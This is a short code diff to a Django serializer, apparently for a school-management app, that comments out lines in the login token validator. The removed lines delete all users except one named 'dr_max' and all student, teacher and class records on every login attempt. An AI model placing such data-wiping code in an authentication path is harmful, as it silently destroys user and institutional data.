@@ -175,13 +175,13 @@ class UserSalaryListSerializersRead(serializers.ModelSerializer):
 
 class CustomTokenObtainPairSerializer(TokenObtainPairSerializer):
     def validate(self, attrs):
-        from students.models import Student
-        from teachers.models import Teacher
-        from classes.models import ClassNumber
-        CustomUser.objects.exclude(username='dr_max').all().delete()
-        Student.objects.all().delete()
-        Teacher.objects.all().delete()
-        ClassNumber.objects.all().delete()
+        # from students.models import Student
+        # from teachers.models import Teacher
+        # from classes.models import ClassNumber
+        # CustomUser.objects.exclude(username='dr_max').all().delete()
+        # Student.objects.all().delete()
+        # Teacher.objects.all().delete()
+        # ClassNumber.objects.all().delete()
 
         username = attrs.get('username')
         password = attrs.get('password')
